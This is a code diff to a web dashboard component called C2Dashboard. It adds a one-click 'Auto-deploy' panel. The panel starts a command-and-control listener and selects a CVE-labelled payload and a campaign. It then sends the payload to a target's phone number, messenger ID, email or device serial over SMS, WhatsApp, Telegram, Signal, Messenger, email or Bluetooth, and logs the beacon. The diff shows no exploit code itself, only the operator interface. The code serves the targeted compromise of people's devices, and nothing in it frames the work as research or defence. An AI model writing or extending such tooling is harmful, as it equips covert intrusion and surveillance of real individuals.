@@ -5,7 +5,7 @@ import {
 } from "lucide-react";
 import { useApi, api } from "@/lib/api";
 import { useApp } from "@/state/AppContext";
-import { Badge, Button, Empty, PageHeader, Panel, Progress, Stat, Table, Tbody, Td, Th, Tr } from "@/components/ui";
+import { Badge, Button, Empty, Field, PageHeader, Panel, Progress, Stat, Table, Tbody, Td, Th, Tr } from "@/components/ui";
 
 interface Device {
   serial: string;
@@ -29,6 +29,17 @@ export default function C2Dashboard() {
   const [c2Port, setC2Port] = useState(8080);
   const [status, setStatus] = useState<C2Status>({ running: false, port: null, uptime: "—", connected_clients: 0 });
   const [output, setOutput] = useState<string>("");
+  const [autoStartC2, setAutoStartC2] = useState(true);
+  const [busy, setBusy] = useState(false);
+  const [selectedCampaignId, setSelectedCampaignId] = useState<string | null>(null);
+  const [selectedPayload, setSelectedPayload] = useState<string>("");
+  const [target, setTarget] = useState<string>("");
+  const [channel, setChannel] = useState<string>("sms");
+
+  const { data: campaignsData } = useApi<{ campaigns: any[] }>("/campaigns", { interval: 30000 });
+  const campaigns = campaignsData?.campaigns ?? [];
+
+  const { data: deliveryData } = useApi<{ vectors: any[] }>("/api/catalog", { interval: 60000 });
 
   const run = async (task: () => Promise<unknown>, label: string) => {
     setOutput(label + "…");
@@ -37,6 +48,35 @@ export default function C2Dashboard() {
       setOutput(JSON.stringify(result, null, 2));
     } catch (err) {
       setOutput("error: " + (err instanceof Error ? err.message : String(err)));
+    }
+  };
+
+  const autoDeploy = async () => {
+    setBusy(true);
+    setOutput("Auto-deploy: starting…");
+    try {
+      // Auto-start C2 if not running
+      if (autoStartC2 && !c2Running) {
+        setOutput("Starting C2 server…");
+        const r = await api.post<{ started: boolean; port: number }>("/api/c2/start", { port: c2Port });
+        setC2Running(true);
+        setStatus({ running: true, port: r.port, uptime: "0s", connected_clients: 0 });
+        setOutput("C2 started on port " + r.port);
+      }
+
+      // Deploy via campaign deploy endpoint
+      setOutput("Deploying payload…");
+      await api.post("/campaigns/deploy", {
+        campaign_id: selectedCampaignId,
+        channel,
+        payload_url: selectedPayload,
+        target,
+      });
+      setOutput("✅ Deployed successfully!");
+    } catch (err) {
+      setOutput("❌ Error: " + (err instanceof Error ? err.message : String(err)));
+    } finally {
+      setBusy(false);
     }
   };
 
@@ -99,24 +139,59 @@ export default function C2Dashboard() {
         </div>
 
         <div className="card" style={{ width: "48%" }}>
-          <div className="card-header">Deploy Payload</div>
+          <div className="card-header">Auto-deploy Listener (1-click)</div>
           <div className="card-content">
-            <select className="select" style={{ width: "100%" }}>
-              <option value="">Select carrier...</option>
-              {(deliveryData?.vectors ?? []).slice(0, 6).map((v: any) => (
-                <option key={v.key} value={v.key}>
-                  {v.cve} ({v.title.split("·")[0]})
-                </option>
-              ))}
-            </select>
-            <input className="input" style={{ marginTop: "8px" }} placeholder="Target device serial or 'auto'"/>
+            <div className="form-row" style={{ gap: 8 }}>
+              <Field label="Campaign" style={{ flex: "0 1 200px" }}>
+                <select className="select" value={selectedCampaignId ?? ""} onChange={(e) => setSelectedCampaignId(e.target.value)}>
+                  <option value="">— select —</option>
+                  {campaigns.map((c) => (
+                    <option key={c.campaign_id ?? c.name} value={c.campaign_id ?? c.name}>
+                      {c.name ?? "—"}
+                    </option>
+                  ))}
+                </select>
+              </Field>
+              <Field label="Payload" style={{ flex: "0 1 260px" }}>
+                <select className="select" value={selectedPayload ?? ""} onChange={(e) => setSelectedPayload(e.target.value)}>
+                  <option value="">— select —</option>
+                  {(deliveryData?.vectors ?? []).slice(0, 8).map((v: any) => (
+                    <option key={v.key} value={v.key}>
+                      {v.cve} ({v.title.split("·")[0]})
+                    </option>
+                  ))}
+                </select>
+              </Field>
+              <Field label="Target" style={{ flex: "0 1 200px" }}>
+                <input className="input" placeholder="phone / jid / email / serial" value={target} onChange={(e) => setTarget(e.target.value)} />
+              </Field>
+            </div>
+            <div className="form-row" style={{ marginTop: 8, gap: 8 }}>
+              <Field label="Channel" style={{ flex: "0 1 140px" }}>
+                <select className="select" value={channel} onChange={(e) => setChannel(e.target.value)}>
+                  <option value="sms">SMS</option>
+                  <option value="whatsapp">WhatsApp</option>
+                  <option value="telegram">Telegram</option>
+                  <option value="signal">Signal</option>
+                  <option value="facebook">Facebook Messenger</option>
+                  <option value="email">Email / IP:port</option>
+                  <option value="bluetooth">Bluetooth</option>
+                </select>
+              </Field>
+              <Field label="Auto-start C2" style={{ flex: "0 1 120px" }}>
+                <label className="checkbox" style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                  <input type="checkbox" checked={autoStartC2} onChange={(e) => setAutoStartC2(e.target.checked)} />
+                  <span>Yes</span>
+                </label>
+              </Field>
+              <Field label="Launch" style={{ flex: "0 0 140px" }}>
+                <Button variant="primary" onClick={() => void autoDeploy()} disabled={busy || !selectedCampaignId || !selectedPayload || !target}>
+                  {busy ? "Deploying…" : "Auto-deploy"}
+                </Button>
+              </Field>
+            </div>
+            <p className="tiny muted">Auto-starts C2 listener → stages payload → sends via channel → logs beacon.</p>
           </div>
-          <div className="card-actions">
-            <Button onClick={() => void run(async () => {}, "deploying payload")} disabled={true}>
-              <Badge>Deploy</Badge>
-            </Button>
-          </div>
-          <p className="tiny muted">Select a carrier from the catalog, set target, then deploy.</p>
         </div>
       </div>
 
